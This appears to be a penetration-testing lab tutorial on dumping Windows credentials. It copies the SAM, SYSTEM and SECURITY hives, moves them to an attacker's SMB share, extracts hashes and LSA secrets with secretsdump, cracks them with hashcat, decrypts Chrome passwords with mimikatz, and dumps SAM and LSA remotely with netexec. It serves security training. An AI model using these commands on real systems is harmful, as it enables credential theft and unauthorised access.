With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline. Performing this process offline allows us to continue our attacks without having to maintain an active session with the target..

## Registry hives

There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:

| Registry Hive   | Description                                                                                                                                                       |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`      | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                                        |
| `HKLM\SYSTEM`   | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                |
| `HKLM\SECURITY` | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |
#### Using reg.exe to copy registry hives

By launching `cmd.exe` with administrative privileges, we can use `reg.exe` to save copies of the registry hives. Run the following commands:

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

If we're only interested in dumping the hashes of local users, we need only `HKLM\SAM` and `HKLM\SYSTEM`. However, it's often useful to save `HKLM\SECURITY` as well, since it can contain cached domain user credentials on domain-joined systems, along with other valuable data. Once these hives are saved offline, we can use various methods to transfer them to our attack host. In this case, we'll use Impacket's [smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) in combination with some basic CMD commands to move the hive copies to a share hosted on our attacker machine.

#### Creating a share with smbserver

To create the share, we simply run `smbserver.py -smb2support`, specify a name for the share (e.g., `CompData`), and point to the local directory on our attack host where the hive copies will be stored (e.g., `/home/ltnbob/Documents`). The `-smb2support` flag ensures compatibility with newer versions of SMB. If we do not include this flag, newer Windows systems may fail to connect to the share, as SMBv1 is disabled by default due to [numerous severe vulnerabilities](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) and publicly available exploits.

```shell-session
Ovas420@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Once the share is running on our attack host, we can use the `move` command on the Windows target to transfer the hive copies to the share.
#### Moving hive copies to share

```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

We can then confirm that our hive copies were successfully moved to the share by navigating to the shared directory on our attack host and using `ls` to list the files.
```shell-session
Ovas420@htb[/htb]$ ls

sam.save  security.save  system.save
```

## Dumping hashes with secretsdump

One particularly useful tool for dumping hashes offline is Impacket's `secretsdump`. Impacket is included in most modern penetration testing distributions. To check if it is installed on a Linux based system, we can use the `locate` command:

```shell-session
Ovas420@htb[/htb]$ locate secretsdump 
```

Using `secretsdump` is straightforward. We simply run the script with Python and specify each of the hive files we retrieved from the target host.

```shell-session
Ovas420@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up..
```

Here we see that `secretsdump` successfully dumped the `local` SAM hashes, along with data from `hklm\security`, including cached domain logon information and LSA secrets such as the machine and user keys for DPAPI.

Notice that the first step `secretsdump` performs is retrieving the `system bootkey` before proceeding to dump the `local SAM hashes`. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted — which is why having copies of the relevant registry hives, as discussed earlier, is crucial.

Moving on, notice the following line:

```shell-session
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

This tells us how to interpret the output and which hashes we can attempt to crack. Most modern Windows operating systems store passwords as `NT hashes`. Older systems (such as those prior to Windows Vista and Windows Server 2008) may store passwords as `LM hashes`, which are weaker and easier to crack. Therefore, LM hashes are useful if the target is running an older version of Windows.

With this in mind, we can copy the NT hashes associated with each user account into a text file and begin cracking passwords. It is helpful to note which hash corresponds to which user to keep track of the results.

## Cracking hashes with Hashcat

Once we have the hashes, we can begin cracking them using [Hashcat](https://hashcat.net/hashcat/).

As mentioned earlier, we can populate a text file with the NT hashes we were able to dump.

```shell-session
Ovas420@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Now that the NT hashes are in our text file (`hashestocrack.txt`), we can use Hashcat to crack them.

#### Running Hashcat against NT hashes

Hashcat supports many different modes, and selecting the right one depends largely on the type of attack and the specific hash type we want to crack. We will use the `-m` option to specify hash type `1000`, which corresponds to NT hashes (also known as NTLM-based hashes). For a full list of supported hash types and their associated mode numbers, we can refer to Hashcat's [wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes) or consult the man page.

```shell-session
Ovas420@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

Keep in mind that this is a well-known technique, and administrators may have implemented safeguards to detect or prevent it. Several detection and mitigation strategies are [documented](https://attack.mitre.org/techniques/T1003/002/) within the MITRE ATT&CK framework.

## DCC2 hashes

As mentioned previously, `hklm\security` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash. The Hashcat mode for cracking DCC2 hashes is `2100`.

```shell-session
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

Note the cracking speed of `5536 H/s`. On the same machine, NTLM hashes can be cracked at `4605.4 kH/s`. This means that cracking DCC2 hashes is approximately `800 times slower`. The exact numbers will depend heavily on the hardware available, of course, but the takeaway is that strong passwords are often uncrackable within typical penetration testing timeframes.

## DPAPI
In addition to the DCC2 hashes, we previously saw that the `machine and user keys` for `DPAPI` were also dumped from `hklm\security`. The Data Protection Application Programming Interface, or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection), is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis. These blobs are utilized by various Windows OS features and third-party applications. Below are just a few examples of applications that use DPAPI and how they use it:

|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|
DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).


```cmd-session
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
```

## Remote dumping & LSA secrets considerations

With access to credentials that have `local administrator privileges`, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.
#### Dumping LSA secrets remotely

```shell-session
Ovas420@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
#### Dumping SAM Remotely

Similarly, we can use netexec to dump hashes from the SAM database remotely.
```shell-session
Ovas420@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
